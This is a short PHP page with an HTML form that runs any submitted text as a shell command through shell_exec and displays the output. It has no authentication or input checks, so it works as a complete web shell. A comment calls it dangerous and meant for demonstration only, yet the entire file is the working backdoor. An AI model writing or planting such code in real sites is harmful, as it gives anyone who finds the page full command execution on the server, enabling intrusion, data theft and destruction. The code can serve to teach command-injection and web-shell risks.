<form method="post">
    <input type="text" name="command" placeholder="Enter command" style="width: 400px;">
    <input type="submit" value="Run">
</form>
<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['command'])) {
    $command = $_POST['command'];
    // WARNING: This is dangerous and should not be used in production!
    // For demonstration only.
    $output = shell_exec($command . ' 2>&1');
    echo "<pre>" . htmlspecialchars($output) . "</pre>";
}
?>
